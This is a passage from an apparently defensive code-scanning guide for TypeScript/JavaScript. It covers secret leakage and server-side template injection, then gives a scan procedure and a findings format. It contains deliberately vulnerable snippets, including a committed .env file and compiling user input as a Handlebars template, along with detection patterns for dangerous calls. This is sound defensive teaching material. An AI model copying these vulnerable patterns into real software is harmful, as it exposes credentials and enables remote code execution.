- Hardcoded secrets: `const API_KEY = 'sk-live-abc123...'`
- Committed `.env` files without `.gitignore` entries
- `NEXT_PUBLIC_SECRET_KEY` making secrets available client-side
- `console.log(process.env)` dumping all environment variables
- Webpack `DefinePlugin` or Vite `define` exposing server secrets to client bundles
- Error responses including `process.env` values

**Safe Alternative:**
- Use secret managers (AWS Secrets Manager, Vault, Doppler)
- Never prefix secrets with `NEXT_PUBLIC_` or `VITE_`
- Add `.env*` to `.gitignore`
- Use `dotenv` only in development, use proper secret injection in production
- Audit bundled code for leaked env vars using `source-map-explorer`

**Vulnerable Code:**
```typescript
// .env (committed to repo)
DATABASE_URL=postgres://admin:password@prod-db:5432/app
NEXT_PUBLIC_STRIPE_SECRET=sk_live_abc123

// next.config.js - leaks to client bundle
module.exports = {
  env: {
    DB_PASSWORD: process.env.DB_PASSWORD,
  },
};
```

**Safe Code:**
```typescript
// .env.local (in .gitignore)
DATABASE_URL=postgres://admin:password@localhost:5432/app
STRIPE_SECRET_KEY=sk_test_...

// Only public-safe values get the prefix
NEXT_PUBLIC_STRIPE_PUBLISHABLE=pk_live_...

// Server-only access in app/api/payment/route.ts
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);
```

---

### 24. Server-Side Template Injection in Handlebars/EJS/Pug

**Description:** Template engines that compile user input into templates (rather than using it as data) enable remote code execution through template syntax.

**Dangerous Functions / Patterns:**
- `Handlebars.compile(userInput)` compiling user-controlled template strings
- `ejs.render(userInput, data)` with user-controlled template
- `pug.render(userInput)` with user-controlled template
- Allowing user-defined template helpers/partials
- Nunjucks with `autoescape: false`

**Safe Alternative:**
- Never compile user input as a template; only pass user input as template data
- Use auto-escaping (enabled by default in most engines)
- Restrict available template helpers and partials
- Use sandboxed template engines like Nunjucks with `autoescape: true`
- Prefer React/JSX server rendering which has no template injection surface

**Vulnerable Code:**
```typescript
app.post('/preview', (req, res) => {
  const template = Handlebars.compile(req.body.template); // SSTI
  const html = template({ name: 'User' });
  res.send(html);
});
```

**Safe Code:**
```typescript
// Pre-compiled templates only
const templates = new Map<string, HandlebarsTemplateDelegate>();

for (const file of fs.readdirSync('./templates')) {
  const source = fs.readFileSync(`./templates/${file}`, 'utf8');
  templates.set(path.basename(file, '.hbs'), Handlebars.compile(source));
}

app.post('/preview', (req, res) => {
  const template = templates.get(req.body.templateName);
  if (!template) return res.status(400).send('Unknown template');
  const html = template({ name: req.body.name }); // User data as context only
  res.send(html);
});
```

---

## Scan Procedure

1. **Enumerate TypeScript/JavaScript files** across the project, including `.ts`, `.tsx`, `.js`, `.jsx`, `.mjs`, `.cjs` files and configuration files (`tsconfig.json`, `package.json`, `.eslintrc`, `next.config.*`).

2. **For each vulnerability category above**, search the codebase for the listed dangerous patterns using AST-aware matching when possible, falling back to regex patterns.

3. **Classify findings by severity:**
   - **Critical:** RCE vectors (eval injection, child_process injection, vm escape, SSTI, prototype pollution leading to RCE)
   - **High:** XSS, SQL injection via raw queries, SSRF, JWT misconfiguration, auth bypass
   - **Medium:** ReDoS, CORS misconfiguration, insecure randomness, timing attacks, error leakage
   - **Low:** TypeScript type safety bypass, missing security headers, suboptimal patterns

4. **Check framework-specific configurations:**
   - Next.js: `next.config.js` security headers, CSP, middleware matchers
   - Express: Helmet configuration, body parser limits, trust proxy
   - React: StrictMode enabled, no deprecated lifecycle methods with unsafe patterns

5. **Verify dependency security:**
   - Run `npm audit` / `pnpm audit` analysis
   - Check for known vulnerable packages
   - Verify lockfile integrity
   - Scan for lifecycle script abuse in dependencies

6. **Report findings** with file path, line number, severity, category, description, and remediation guidance referencing the safe code examples above.

## Output Format

### Finding: TS-{NNN}
- **Title:** TypeScript/JavaScript-specific vulnerability
- **Severity:** Critical | High | Medium | Low
- **Confidence:** 0-100
- **File:** file/path:line
- **Vulnerability Type:** CWE-XXX
- **Description:** What was found
- **Remediation:** Framework-idiomatic fix with code example
- **References:** CWE link, framework documentation
